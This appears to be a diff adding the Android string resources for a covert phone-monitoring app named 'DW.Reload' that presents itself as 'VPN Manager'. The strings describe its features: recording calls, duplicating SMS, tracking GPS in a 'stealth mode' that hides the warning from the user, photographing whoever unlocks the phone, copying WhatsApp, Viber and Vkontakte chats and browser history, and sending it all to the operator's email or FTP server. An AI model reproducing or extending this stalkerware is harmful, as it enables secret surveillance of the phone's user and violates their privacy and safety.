@@ -1,0 +1,222 @@
+<?xml version="1.0" encoding="utf-8"?>
+<resources>
+    <string name="app_name">VPN Manager</string>
+    <string name="app_name_real">DW.Reload</string>
+    <string name="default_code">001</string>
+    
+    <string-array name="screen_timer">
+        <item>10 sec</item>
+		<item>30 sec</item>
+		<item>1 min</item>
+		<item>2 min</item>
+		<item>5 min</item>
+		<item>10 min</item>
+	</string-array>
+	
+    <string-array name="screen_timer_val">
+        <item>10</item>
+		<item>30</item>
+		<item>60</item>
+		<item>120</item>
+		<item>300</item>
+		<item>600</item>
+	</string-array>
+    
+    <string-array name="gps_timer">
+        <item>Often (~1 min)</item>
+		<item>Sometimes (~10 min)</item>
+		<item>Seldom (~30 min)</item>
+	</string-array>
+	
+    <string-array name="gps_timer_val">
+        <item>1</item>
+		<item>10</item>
+		<item>30</item>
+	</string-array>
+	
+    <string-array name="record_format">
+        <item>3GPP</item>
+		<item>AMR</item>
+	</string-array>
+	
+    <string-array name="record_format_val">
+        <item>1</item>
+		<item>3</item>
+	</string-array>
+	
+    <string-array name="record_source">
+        <item>DEFAULT</item>
+		<item>MIC</item>
+		<item>VOICE_UPLINK</item>
+		<item>VOICE_DOWNLINK</item>
+		<item>VOICE_CALL</item>
+		<item>CAMCORDER</item>
+		<item>VOICE_RECOGNITION</item>
+		<item>VOICE_COMMUNICATION</item>
+	</string-array>
+	
+    <string-array name="record_source_val">
+        <item>0</item>
+		<item>1</item>
+		<item>2</item>
+		<item>3</item>
+		<item>4</item>
+		<item>5</item>
+		<item>6</item>
+		<item>7</item>
+	</string-array>
+	
+    <string-array name="capture_photo_format">
+        <item>Small (640x480)</item>
+		<item>Medium (800x600)</item>
+		<item>HD (1280×720)</item>
+	</string-array>
+	
+    <string-array name="capture_photo_format_val">
+        <item>640</item>
+		<item>800</item>
+		<item>1280</item>
+	</string-array>
+	
+
+    <string name="idLabel">IMEI:</string>
+    <string name="settings">Settings</string>
+    <string name="filter">Filter</string>
+    
+	<string name="useFilter">Enable filter</string>
+	<string name="watchFor">Watch for calls and sms…</string>
+	<string name="onlyFromList">… only on the numbers from the list</string>
+	<string name="exceptList">… from everyone except numbers from the list</string>
+	<string name="phoneNumber">Phone number</string>
+	<string name="add">Add</string>
+	<string name="filterHint">*A long press on the number of removal</string>
+	<string name="plus">+</string>
+	
+	<string name="settings_phone_id_summary">Phone ID in reports (can be left blank, in this case will be used phone IMEI)</string>
+    <string name="settings_phone_id">Phone name</string>
+	<string name="copyright">Odrin/VDLab</string>
+	<string name="dwreload">DW.Reload</string>
+    
+    <string name="gps">GPS</string>
+    <string name="gpsEnableDescr">Send GPS coordinates to the mail</string>
+    <string name="gpsOnlyNew">Only new coordinates</string>
+    <string name="gpsOnlyNewDescr">Send coordinates only if they have changed (disabling this feature will increase the web traffic)</string>
+    <string name="gpsInterval">Interval</string>
+    <string name="gpsDescr">Set the interval positioning</string>
+    <string name="gpsTitle">Select the interval</string>
+    
+    <string name="settings_noNumber">Number for notifications is not set</string>
+    <string name="settings_onlyDigits">The code must consist of numbers</string>
+    <string name="settings_emptyCode">The code can not be empty</string>
+    <string name="settings_numberError">Entered an incorrect number</string>
+
+    <string name="settings_dataTransfer">Data transfer</string>
+    <string name="settings_wifionly">Wi-Fi Only</string>
+    <string name="settings_wifionly_summary">Send data to the server only via Wi-Fi.</string>
+    <string name="settings_wifionly_files_summary">Send files (screenshots/photos/record) to the server only via Wi-Fi.</string>
+    <string name="settings_runcode">Run code</string>
+    <string name="settings_runcode_summary">Application run code (**Your code**)</string>
+    <string name="settings_runcode_title">Your code</string>
+    <string name="settings_phonenumber">Telephone number</string>
+    <string name="settings_phonenumber_summary">Phone number that will receive the alert</string>
+    <string name="settings_smsnotification">Sms alert</string>
+    <string name="settings_simnotification">Changing the sim-card</string>
+    <string name="settings_simnotification_summary">Notify a change sim-card by Sms</string>
+    <string name="settings_sms">Sms</string>
+    <string name="settings_sms_summary">Duplicate SMS to a specified number</string>
+    <string name="settings_calls">Calls</string>
+    <string name="settings_calls_summary">Announce calls via SMS to a specified number</string>
+    <string name="settings_callrecord">Call Recording</string>
+    <string name="settings_record">Record calls</string>
+    <string name="settings_record_summary">Record incoming and outgoing calls</string>
+    <string name="settings_recordfromline">Record from line</string>
+    <string name="settings_recordfromline_summary">Keep a record of the line. Well heard both of them, but does not work on all devices. If not enabled, the record is maintained through the microphone.</string>
+    <string name="settings_recordformat">Audio format</string>
+    <string name="settings_recordformat_summary">The format of the audio recordings</string>
+    <string name="settings_photo">Sending photos</string>
+    <string name="settings_phototransfer">Send photos</string>
+    <string name="settings_phototransfer_summary">Sent to the server photos taken with the phone camera</string>
+    <string name="settings_imagesize">Image size</string>
+    <string name="settings_imagesize_summary">The size of the projected image. Transferring images to a server consumes a larger more internet traffic.</string>
+    <string name="settings_screenshots_title">Screenshots</string>
+    <string name="settings_screenshots">Take screenshots ®</string>
+    <string name="addstring">---</string>
+    <string name="settings_screenshots_summary">Take screenshots with the specified interval. To work requires root. only works on Android 4.0 and above. Files are transferred to the server \"packs\" not less than 10.</string>
+    <string name="settings_screenshots_interval">Interval</string>
+    <string name="settings_screenshots_interval_summary">The interval at which to take screenshots</string>
+    
+	<string name="settings_gps_hide">Stealth mode</string>
+    <string name="settings_gps_hide_summary">Hide work of GPS. Searching only happens when the screen is off and closed when it is turned on. The user will not see the warning \"Find GPS\".</string>
+    <string name="settings_record_source_title">Audio Source</string>
+    <string name="settings_record_source_summary">Source of the sound recording. Do not change this setting if you do not know what it is and how it works!</string>
+    <string name="camera">Camera</string>
+    <string name="settings_front_cameta_title">Use front camera</string>
+    <string name="settings_front_cameta_summary">Take picture by front camera when user unlock the screen. Files are transferred to the server \"packs\" not less than 10 pieces. Viewing these images is available only to users with PRO account.</string>
+    <string name="battery">Battery</string>
+    
+    <string name="settings_browser_history_title">Copy browser history</string>
+    <string name="settings_browser_history_summary">Save and send browser history. Works only with standart Android browser.</string>
+    <string name="settings_vk">Copy correspondence ®</string>
+    <string name="settings_vk_summary">Correspondence sent to the server \"Vkontakte\". Works only with official client \"Vkontakte\". Requires root.</string>
+    <string name="settings_wa">Copy correspondence ®</string>
+    <string name="settings_wa_summary">Correspondence sent to the server \"WhatsApp\". Requires root.</string>
+    <string name="settings_vb">Copy correspondence ®</string>
+    <string name="settings_vb_summary">Correspondence sent to the server \"Viber\". Requires root.</string>
+    
+    <string name="files">Files</string>
+    <string name="ftp_addr">FTP address or its IP</string>
+    <string name="ftp_port">port</string>
+    <string name="ftp_name">User name</string>
+    <string name="ftp_pass">user password</string>
+    <string name="ftp_work_path">path on server(create manually before use)</string>
+    <string name="settings_FTP">FTP Settings</string>
+
+    <string name="settings_Mail">Mail settings</string>
+    <string name="email_addr">You email</string>
+    <string name="email_usr_pass">user password</string>
+    <string name="popserver">SMTP server address</string>
+    <string name="settings_sms_to">resend SMS</string>
+    <string name="settings_calls_to">info about calls</string>
+    <string name="settings_gps_to">GPS data</string>
+    <string name="settings_history_to">Browser history</string>
+    <string name="settings_other_to">All other reports</string>
+    <string name="social_to">Social networks</string>
+    <string name="incall">Incoming call from</string>
+    <string name="outcall">Outgoing call to</string>
+    <string name="misscall">Missed call from</string>
+    <string name="insms">Incoming message from</string>
+    <string name="outsms">Outgoing message for</string>
+    <string name="smsbody">Text</string>
+    <string name="missedsms">Unreaded message from</string>
+    <string name="calllength">Length</string>
+    <string name="timeanddate">Date/time</string>
+    <string name="minutes">min.</string>
+    <string name="seconds">sec.</string>
+    <string name="test">Test</string>
+    <string name="testmail">Trying to send test message</string>
+    <string name="success">Success!</string>
+    <string name="error">Error! Check settings!</string>
+    <string name="accuracy">Accuracy</string>
+    <string name="manycalls">Calls history</string>
+    <string name="manysms">Sms history</string>
+    <string name="dayreport">Everyday reports</string>
+    <string name="dayreport_descr">Send reports about events per day at the specified time</string>
+    
+    <string name="advanced">Advanced</string>
+    <string name="backinsdfront">Use back camera instead front for selfshots</string>
+    <string name="numinrecordname">Insert phone number in records file name(does not work on some devices!)</string>
+    <string name="codeword1">Codeword 1</string>
+    <string name="codeword2">Codeword 2</string>
+    <string name="codeword3">Codeword 3</string>
+    <string name="command1">Command 1</string>
+    <string name="command2">Command 2</string>
+    <string name="command3">Command 3</string>
+    <string name="ifnophoto">If you do not receive photo from camera, type path to folder where photos stored.</string>
+    <string name="photopath">Path to /DCIM/ directory</string>
+    
+    <!--string name="directory_selected_label">Directory selected:</string>
+    <string name="choose_directory">Choose Directory</string>
+    <string name="none">none</string-->
+    <string name="btn_choose">Choose Directory</string>
+    <!-- string name="btn_switch">Switch to Dialog Sample</string-->
+</resources>
